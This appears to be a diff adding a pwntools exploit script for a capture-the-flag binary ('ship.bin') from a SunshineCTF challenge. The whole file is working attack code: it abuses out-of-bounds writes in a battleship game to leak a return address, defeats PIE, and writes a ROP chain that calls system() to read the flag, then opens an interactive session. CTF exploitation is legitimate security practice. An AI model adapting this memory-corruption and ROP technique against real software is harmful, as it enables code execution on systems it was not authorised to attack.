@@ -1,0 +1,131 @@
+#!/usr/bin/env python3
+from pwn import *
+import sys
+
+binary = args.BIN or "attachments/ship.bin"
+context.terminal = ["tmux", "splitw", "-h"]
+e = context.binary = ELF(binary)
+
+if args.REMOTE:
+    TIMEOUT = 0.5
+else:
+    TIMEOUT = 0.1
+
+gs = '''
+continue
+'''
+
+def get_remote():
+    if args.GDB:
+        # return gdb.debug(e.path, gdbscript=gs)
+        return e.debug(gdbscript=gs)
+    elif args.REMOTE:
+        HOST = args.HOST or "2024.sunshinectf.games"
+        PORT = int(args.PORT or 24003)
+        return remote(HOST, PORT)
+    else:
+        return process(e.path)
+
+def start():
+    p = get_remote()
+    s = p.recvn(10, timeout=TIMEOUT)
+    if s != b'Password: ':
+        p.unrecv(s)
+        return p
+    p.sendline(b'block the haters')
+    return p
+
+def end_game():
+    log.info('Carpet Bombing All Ships To End Game...')
+    try:
+        for i in range(256,512):
+            p.sendlineafter(b'Enter the row (0-9, a-f) >>>',f'1'.encode(),timeout=TIMEOUT)
+            p.sendlineafter(b'Enter the column (0-9, a-f) >>>',f'{i}'.encode(),timeout=TIMEOUT)
+            p.sendlineafter(b'Custom (C) >>>',b'C',timeout=TIMEOUT)
+            p.sendlineafter(b'ASCII character >>>',b'H',timeout=TIMEOUT)
+    except:
+        log.info('Bombing Run Complete')
+
+
+def ret_leak(offset):
+    addr = b''
+    for i in range(offset,offset+8):
+        p.sendlineafter(b'Enter the row (0-9, a-f) >>>',f'-1'.encode(),timeout=TIMEOUT)
+        p.sendlineafter(b'Enter the column (0-9, a-f) >>>',f'{i+offset}'.encode(),timeout=TIMEOUT)
+        p.sendlineafter(b'Custom (C) >>>',b'C',timeout=TIMEOUT)
+        p.sendlineafter(b'ASCII character >>>',b'H',timeout=TIMEOUT)
+        p.recvuntil(b'<<< Fired outside board, corrupting')
+        p.recvuntil(b'from ')
+        addr=p.recv(2)+addr
+
+    addr = int(addr,16)
+    return addr
+
+'''
+def ret_leaks():
+    for i in range(0,600,8):
+        addr=ret_leak(i)
+        log.info(f'Offset: {i}, Addr: {hex(addr)}')
+'''
+
+def stack_write(chain,offset):
+    try:
+        log.info(f'Writing to Stack...')
+        for i in range(0,len(chain)):
+            p.sendlineafter(b'Enter the row (0-9, a-f) >>>',f'1'.encode(),timeout=TIMEOUT)
+            p.sendlineafter(b'Enter the column (0-9, a-f) >>>',f'{i+offset}'.encode(),timeout=TIMEOUT)
+            p.sendlineafter(b'Custom (C) >>>',b'C',timeout=TIMEOUT)
+            p.sendlineafter(b'ASCII character >>>',bytes([chain[i]]),timeout=TIMEOUT)
+    except:
+        log.info("Lost before finished stack write. Try again.")
+        sys.exit()
+        
+def chain_has_bad_bytes(chain):
+    bad_bytes = bytes([0x09, 0x0A, 0x0B, 0x0C, 0x20])
+    if any(b in chain for b in bad_bytes):
+        return True
+    return False
+
+def throw_sploit():
+    offset = 520
+    pie_addr = ret_leak(312)
+    log.info(f'pie_addr={hex(pie_addr)}')
+    e.address=pie_addr-0x3d80
+    log.info(f'PIE Base: {hex(e.address)}')
+
+    r = ROP(e)
+    pop_rdi = r.find_gadget(['pop rdi','ret'])[0]
+    ret = r.find_gadget(['ret'])[0]
+    sh =next(e.search(b'cat<flag.txt\0'))
+    slep =next(e.search(b'sleep 60\0'))
+    system = e.sym['system']
+
+    log.info(f'Ret Gadget: {hex(ret)}')
+    log.info(f'Pop RDI Gadget: {hex(pop_rdi)}')
+    
+    chain = p64(ret)*4
+    chain += p64(pop_rdi)
+    chain += p64(sh)
+    chain += p64(ret)
+    chain += p64(system)
+    chain += p64(ret)*4
+    chain += p64(pop_rdi)
+    chain += p64(slep)
+    chain += p64(ret)
+    chain += p64(system)
+
+    if chain_has_bad_bytes(chain):
+       log.warn(f'Try Again. Bad Byte in Gadgets')
+       p.close()
+       return False
+
+    stack_write(chain,offset)
+    end_game()
+    p.interactive()
+    return True
+
+while True:
+    p = start()
+    sploit_landed = throw_sploit()
+    if sploit_landed or args.GDB:
+        break
